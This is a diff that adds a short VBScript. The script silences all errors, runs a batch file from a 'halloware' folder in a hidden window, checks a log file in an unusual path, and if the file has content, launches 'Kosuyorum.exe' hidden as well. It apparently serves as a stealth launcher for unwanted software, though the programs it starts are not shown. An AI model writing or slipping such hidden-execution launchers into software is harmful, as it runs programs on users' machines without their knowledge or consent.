@@ -1,0 +1,18 @@
+set x = createobject("Wscript.Shell")
+set c = createobject("scripting.filesystemobject")
+set objshell = createobject("Shell.Application")
+On error resume next
+'/////////////////////////////////////////////////////////////////
+'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+x.run """C:\Program Files\halloware\findit.bat""",0
+wscript.sleep 2000
+dim rer
+set z = c.OpenTextFile("C:\logfilex7\msc.ddd")
+rer = z.ReadLine
+
+if rer="" then
+wscript.quit
+else
+x.run "cmd.exe /c cd\ & cd ""Program Files""& cd Halloware & Kosuyorum.exe",0
+end if
